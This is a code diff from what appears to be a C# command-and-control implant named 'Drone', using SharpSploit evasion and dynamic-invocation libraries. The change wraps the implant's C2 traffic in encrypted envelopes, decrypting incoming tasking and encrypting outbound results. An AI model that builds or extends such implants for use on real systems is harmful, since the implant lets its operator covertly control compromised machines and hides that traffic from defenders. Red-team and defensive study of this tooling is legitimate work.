@@ -7,7 +7,7 @@ using System.Threading;
 using System.Threading.Tasks;
 
 using Drone.SharpSploit.Evasion;
-using Drone.DynamicInvocation.DynamicInvoke;
+using Drone.Invocation.DynamicInvoke;
 using Drone.Handlers;
 using Drone.Models;
 using Drone.Modules;
@@ -22,6 +22,7 @@ namespace Drone
         private DroneConfig _config;
         private HookEngine _hookEngine;
         private Handler _handler;
+        private Crypto _crypto;
         private bool _running;
 
         private readonly List<DroneModule> _modules = new();
@@ -34,12 +35,12 @@ namespace Drone
             _config = Utilities.GenerateDefaultConfig();
             _metadata = Utilities.GenerateMetadata();
             _hookEngine = new HookEngine();
+            _crypto = new Crypto();
 
             _handler = GetHandler;
             _handler.Init(_config, _metadata);
 
-            var thread = new Thread(async () => { await _handler.Start(); });
-            thread.Start();
+            var t = _handler.Start();
 
             LoadDefaultModules();
 
@@ -53,12 +54,14 @@ namespace Drone
                     continue;
                 }
 
-                foreach (var message in messages) HandleC2Message(message);
+                foreach (var message in messages) HandleMessageEnvelope(message);
             }
         }
 
-        private void HandleC2Message(C2Message message)
+        private void HandleMessageEnvelope(MessageEnvelope envelope)
         {
+            var message = _crypto.DecryptEnvelope(envelope);
+            
             if (message.Type == C2Message.MessageType.DroneTask)
             {
                 var tasks = Convert.FromBase64String(message.Data).Deserialize<IEnumerable<DroneTask>>().ToArray();
@@ -172,7 +175,10 @@ namespace Drone
 
         private void SendC2Message(C2Message message)
         {
-            _handler.QueueOutbound(message);
+            var envelope = _crypto.EncryptMessage(message);
+            envelope.Drone = _metadata.Guid;
+            
+            _handler.QueueOutbound(envelope);
         }
 
         public void AbortTask(string taskGuid)
